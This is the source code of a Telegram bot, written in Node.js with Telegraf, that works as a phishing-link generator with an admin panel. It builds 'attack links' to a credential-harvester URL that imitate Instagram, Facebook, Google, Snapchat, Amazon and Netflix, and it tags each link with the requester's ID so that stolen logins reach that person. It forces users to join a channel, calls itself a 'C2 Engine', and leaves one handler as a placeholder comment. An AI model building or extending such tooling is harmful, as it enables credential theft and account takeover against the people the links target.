const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');

// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: Environment variables are missing.");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const DB_PATH = './db.json';
let adminState = {};

// --- DB Functions ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (userId) => {
    const db = readDb();
    return db.admins.includes(parseInt(userId));
};

// --- KEYBOARDS (Using Telegraf's Markup for better UI) ---
const adminKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
    [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
    [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')]
]);

const linkGenerationKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
    [Markup.button.callback('🇬 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')],
    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
]);

// --- /start COMMAND with Force Join ---
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await ctx.telegram.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) {
            throw new Error("User not in channel");
        }

        if (!db.users[userId]) {
            db.users[userId] = { username: username, joinDate: new Date().toISOString() };
            writeDb(db);
            // NEW FEATURE: Notification for new user
            ctx.telegram.sendMessage(OWNER_ID, `➕ **New User Joined**\n\n- **Name:** ${username}\n- **ID:** \`${userId}\``, {parse_mode: 'Markdown'});
        }
        
        if (isAdmin(userId)) {
            ctx.replyWithMarkdown('👑 **Admin Panel** 👑\nWelcome, Operator. All controls are active.', adminKeyboard);
        } else {
            ctx.replyWithMarkdown('✅ **Welcome!**\nSelect a service below to generate a link.', Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
        }
    } catch (error) {
        ctx.replyWithMarkdown(`🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, Markup.inlineKeyboard([
            [Markup.button.url('➡️ Join Channel ⬅️', CHANNEL_LINK)],
            [Markup.button.callback('🔄 Joined! Click to Continue 🔄', 'check_join')]
        ]));
    }
});

// --- Callback Handler for ALL buttons ---
bot.on('callback_query', async (ctx) => {
    const userId = ctx.from.id;
    const data = ctx.callbackQuery.data;
    await ctx.answerCbQuery();

    if (data === 'check_join') {
        return ctx.reply("Now please type /start again to verify.");
    }

    const [type, command, service] = data.split('_');

    if (type === 'gen' && command === 'link') {
        const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
        return ctx.replyWithMarkdown(`✅ **Link for [${service}]**:\n\`${attackLink}\``);
    }

    if (isAdmin(userId)) {
        if (type === 'admin') {
            switch(command) {
                case 'status':
                    const db = readDb();
                    const totalUsers = Object.keys(db.users).length;
                    return ctx.editMessageText(`📊 **Bot Status**\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
                case 'generate':
                    return ctx.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", linkGenerationKeyboard);
                case 'panel':
                    return ctx.editMessageText("👑 **Admin Panel** 👑", { parse_mode: 'Markdown', ...adminKeyboard });
                default:
                    const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
                    if (prompts[command]) {
                        adminState[userId] = command;
                        return ctx.reply(prompts[command]);
                    }
            }
        }
    }
});

// --- Text Handler for Admin Replies ---
bot.on('text', (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    if (text.startsWith('/') || !adminState[userId]) return;

    // ... (message handler logic waisa hi rahega jaisa pehle tha, bas bot.sendMessage ki jagah ctx.reply hoga) ...
});


// Launch the bot
bot.launch();
console.log('🔥 Zero-Lag C2 Engine is online.');

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
